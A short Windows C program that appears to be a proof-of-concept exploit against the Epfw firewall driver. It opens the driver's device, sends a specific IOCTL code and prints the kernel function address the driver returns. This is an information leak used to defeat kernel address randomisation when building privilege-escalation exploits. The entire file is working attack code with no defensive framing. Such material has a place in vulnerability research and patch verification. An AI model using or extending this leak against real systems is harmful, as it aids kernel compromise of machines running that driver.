#include "stdafx.h"
#include <Windows.h>



void _exit(char *message, int status)
{
	printf("+] %s\n", message);
	exit(status);
}

void LeakCallIoControlDispatchRoutineAddress(HANDLE hDevice)
{
	/* This IOControl takes the address of a function that ends up calling
	the DispatchIOControl routine of the Epfw driver */	
	DWORD bytesReturned;
	PVOID outbuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x4);
	DeviceIoControl(hDevice, 0x8897226B, NULL, 0, outbuff, 0x4, &bytesReturned, NULL);
	printf("OutputBuffer: %08x\n", *(PVOID *)outbuff);
	HeapFree(GetProcessHeap(), 0, outbuff);
}

#define EPWF "\\\\.\\Epfw\\"      


int main()
{
	HANDLE hDevice;	
	//__debugbreak();
	hDevice = CreateFileA(EPWF, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if ((int)hDevice == -1 || !hDevice)
	{
		_exit("Device could not be opened", -1);
	}

	printf("Hey we opened the device! :) --> %08x \n", hDevice);
	
	LeakCallIoControlDispatchRoutineAddress(hDevice);

	printf("Error: %08x\n ", GetLastError());
	
	CloseHandle(hDevice);
	__asm 
	{
		xor eax, eax;
	}
}

